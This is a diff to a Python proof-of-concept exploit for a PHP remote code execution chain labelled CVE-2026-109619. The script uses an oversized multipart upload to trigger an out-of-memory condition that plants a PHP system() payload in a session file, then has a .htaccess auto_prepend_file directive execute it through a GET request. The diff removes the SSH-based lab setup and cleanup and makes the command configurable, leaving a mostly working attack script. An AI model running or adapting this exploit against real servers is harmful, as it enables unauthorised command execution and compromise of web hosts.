@@ -1,14 +1,17 @@
 #!/usr/bin/env python3
 """
 CVE-2026-109619 → HTTP RCE  (against DEFAULT php.ini)
-Target: PHP 8.x + WordPress (stock default php.ini)
+Target: PHP 8.x + Apache with AllowOverride All (stock default php.ini)
 
 PHP is running with stock defaults:
   memory_limit=128M  post_max_size=8M  use_only_cookies=1
 
-But Apache has AllowOverride All (required by WordPress for permalinks).
 A single .htaccess overrides php_value to enable the OOM window AND
 the auto_prepend_file inclusion — all in one file.
+
+Prerequisites (set up before running):
+  1. Place .htaccess in web root (see HTACCESS content below)
+  2. Apache must have AllowOverride All
 
 Chain
 ─────
@@ -19,16 +22,15 @@ Chain
      → auto_prepend target doesn't exist yet → E_WARNING, harmless
   2. Trigger GET:  auto_prepend now finds the session file → includes it
      → PHP parser hits <?php tag inside serialised data → executes → RCE
-
-Setup : 1 file  .htaccess  (created before exploit, removed after)
 """
-import os, socket, subprocess, sys, threading, time
+import os, socket, sys, threading, time
 
 HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
 PORT = int(os.environ.get("TARGET_PORT", "80"))
 SID  = "rce002"
-SESS = f"/var/lib/php/sessions/sess_{SID}"
-CMD  = "id"
+SESS_PATH = os.environ.get("SESSION_PATH", "/var/lib/php/sessions")
+SESS = f"{SESS_PATH}/sess_{SID}"
+CMD  = os.environ.get("CMD", "id")
 PHP  = f"<?php system('{CMD}');die(); ?>"
 
 HTACCESS = f"""\
@@ -36,18 +38,6 @@ php_value memory_limit 8M
 php_value post_max_size 256M
 php_value auto_prepend_file {SESS}
 """
-
-SSH_USER = os.environ.get("SSH_USER", "user")
-SSH_PASS = os.environ.get("SSH_PASS", "pass")
-
-def ssh(cmd, timeout=30):
-    r = subprocess.run(
-        ["sshpass", "-p", SSH_PASS, "ssh",
-         "-o", "StrictHostKeyChecking=no",
-         "-o", "ConnectTimeout=10",
-         f"{SSH_USER}@{HOST}", cmd],
-        capture_output=True, text=True, timeout=timeout)
-    return r.stdout + r.stderr
 
 def multipart(parts, bnd):
     buf = bytearray()
@@ -112,34 +102,19 @@ def resp_status(raw):
 
 # ════════════════════════════════════════════════════════════
 print("=" * 62)
-print("CVE-2026-109619  HTTP → RCE   (default php.ini)")
+print("CVE-2026-109619  HTTP → RCE   (default php.ini + .htaccess)")
 print(f"Target {HOST}:{PORT}   CMD: {CMD}")
+print(f"Session: {SESS}")
 print("=" * 62)
 
-# ── 0  verify php.ini is default ───────────────────────────
-print("\n[0] verify php.ini is stock default …")
-ini = ssh("cat /opt/php-8.4.26/etc/php.ini 2>/dev/null").strip()
-print(f"    php.ini: {ini}")
-ml = ssh("curl -s http://localhost/ok.php -o /dev/null; /opt/php-8.4.26/bin/php -r 'echo ini_get(\"memory_limit\");' 2>/dev/null").strip()
+print("\nRequired .htaccess content:")
+for line in HTACCESS.strip().split("\n"):
+    print(f"  {line}")
 
-# clean state
-ssh(f"echo {SSH_PASS} | sudo -S systemctl restart apache2 2>/dev/null")
-time.sleep(2)
-ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/lib/php/sessions/sess_* 2>/dev/null")
-ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
-print("    apache restarted, sessions cleaned")
+print(f"\nPlace this .htaccess in the target's web root before running.")
 
-# ── 1  create .htaccess (the ONLY file) ───────────────────
-print(f"\n[1] create .htaccess (overrides php_value via AllowOverride All)")
-# Write to /tmp first, then sudo cp
-ssh(f"cat > /tmp/_ht << 'EOF'\n{HTACCESS}EOF")
-ssh(f"echo {SSH_PASS} | sudo -S cp /tmp/_ht /var/www/html/.htaccess && rm /tmp/_ht")
-verify = ssh(f"cat /var/www/html/.htaccess 2>/dev/null").strip()
-for line in verify.split("\n"):
-    print(f"    {line}")
-
-# ── 2  producer OOM ────────────────────────────────────────
-print(f"\n[2] producer OOM   SID={SID}")
+# ── 1  producer OOM ────────────────────────────────────────
+print(f"\n[1] producer OOM   SID={SID}")
 print(f"    filename = {PHP}")
 body = multipart([
     {"name": "PHPSESSID",                   "data": SID},
@@ -150,34 +125,19 @@ body = multipart([
 print(f"    sending {len(body)} bytes …")
 r1 = http_req("POST", "/ok.php", body, b"BOOM", timeout=120)
 print(f"    {resp_status(r1)}")
+
+if b"500" in r1[:50] or len(r1) == 0:
+    print("    ✓ OOM triggered (500 / connection reset)")
+else:
+    print(f"    ? unexpected response — check .htaccess is in place")
+
 time.sleep(0.5)
 
-# ── 3  verify session file ─────────────────────────────────
-print(f"\n[3] check session file …")
-raw = ssh(f"echo {SSH_PASS} | sudo -S cat {SESS} 2>/dev/null")
-size = ssh(f"echo {SSH_PASS} | sudo -S stat -c%s {SESS} 2>/dev/null").strip()
-print(f"    size = {size} bytes")
-if "<?php" in raw:
-    i = raw.find("<?php")
-    snippet = raw[max(0, i - 20):i + len(PHP) + 5]
-    print(f"    ✓ PHP code at offset {i}: …{snippet}…")
-else:
-    print(f"    ✗ no PHP code — session file content:")
-    print(f"      {raw[:300]}")
-    # cleanup before exit
-    ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
-    sys.exit(1)
-
-# ── 4  trigger RCE ─────────────────────────────────────────
-print(f"\n[4] trigger: GET /ok.php")
+# ── 2  trigger RCE ─────────────────────────────────────────
+print(f"\n[2] trigger: GET /ok.php")
+print(f"    auto_prepend_file should include {SESS}")
 r2 = http_req("GET", "/ok.php", timeout=10)
 out = resp_body(r2).decode("latin1", errors="replace")
-
-# ── 5  cleanup ─────────────────────────────────────────────
-print(f"\n[5] cleanup …")
-ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
-ssh(f"echo {SSH_PASS} | sudo -S rm -f {SESS} 2>/dev/null")
-print("    .htaccess + session removed")
 
 # ── result ─────────────────────────────────────────────────
 print("\n" + "=" * 62)
@@ -191,5 +151,5 @@ elif out.strip():
     print(f"  ?  response ({len(out)} chars):")
     print(f"     {out[:500]}")
 else:
-    print("  ✗  empty response")
+    print("  ✗  empty response — check .htaccess is in place")
 print("=" * 62)
